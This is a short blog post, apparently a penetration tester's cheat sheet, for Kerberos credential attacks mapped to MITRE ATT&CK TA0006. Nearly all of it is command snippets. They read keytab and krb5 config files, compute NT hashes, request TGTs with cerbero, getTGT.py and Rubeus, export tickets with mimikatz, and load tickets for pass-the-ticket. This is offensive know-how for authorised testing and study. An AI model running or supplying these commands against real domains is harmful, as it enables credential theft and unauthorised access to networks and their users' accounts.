---
layout: post
title: TA0006 Credentials Forgery - Kerberos
category: pen
parent: cheatsheets
modified_date: 2023-06-08
permalink: /pen/krb
---

**Mitre Att&ck Entreprise**: [TA0006 - Credentials Access](https://attack.mitre.org/tactics/TA0006/)

**Menu**
<!-- vscode-markdown-toc -->
* [prereq](#prereq)
* [ccache-convert](#ccache-convert)
* [get-cache](#get-cache)
* [get-config](#get-config)
* [get-nthash](#get-nthash)
* [get-tgt](#get-tgt)
* [krb-export](#krb-export)
* [krb-ptt](#krb-ptt)

<!-- vscode-markdown-toc-config
	numbering=false
	autoSave=true
	/vscode-markdown-toc-config -->
<!-- /vscode-markdown-toc -->

## <a name='prereq'></a>prereq

* T1558: Steal and Forge Kerberos Tickets 
* Which OS ? What Creds ?
![Windows Credentials by Auth. Service & by OS](/assets/images/win-delpy-creds-table-by-os-til-2012.png)
* [LSA RunAsPPL protection](https://itm4n.github.io/lsass-runasppl/)
* Rubeus compilation / [Wiki](https://github.com/GhostPack/Rubeus) :

## <a name='ccache-convert'></a>ccache-convert

* Convert linux to windows krb ticket :
```
ticket-converter $ztarg_user_name.ccache $ztarg_user_name.krb
cerbero convert -i $ztarg_user_name.ccache -o $ztarg_user_name.krb
```

## <a name='get-cache'></a>get-cache
```
cat /etc/krb5.keytab
echo $KRB5_KTNAME
klist -k -Ke 
```

## <a name='get-config'></a>get-config
```
cat etc/krb5.conf
echo $KRB5_CLIENT_KTNAME
```

## <a name='get-nthash'></a>get-nthash
```
# compute nthash from clea-text password
cerbero hash $ztarg_user_pass -u $zdom_fqdn/$ztarg_user_name
$ztarg_user_nthash=""
$ztarg_user_aes256k=""
```

## <a name='get-tgt'></a>get-tgt
```
#getTGT.py $zz -hashes $ztarg_user_nthash -no-pass -dc-ip $zdom_dc_ip
cerbero ask -u $zdom_fqdn/$ztarg_user_name --aes $ztarg_user_aes256k -k $zdom_dc_ip -vv

cd C:\Tools\GhostPack\Rubeus\Rubeus\bin\Debug
./Rubeus.exe asktgt /user:$ztarg_user_name /password:$ztarg_user_pass /domain:$zdom /dc:$zdom_dc_fqdn /ptt
```

## <a name='krb-export'></a>krb-export
```powershell
cd C:\tools\mimikatz\x64
mimikatz.exe privilege:debug
kerberos::list /export
```

## <a name='krb-ptt'></a>krb-ptt
```bash
# linux
export KRB5CCNAME="$PWD/$ztarg_user_name.krb" 
```

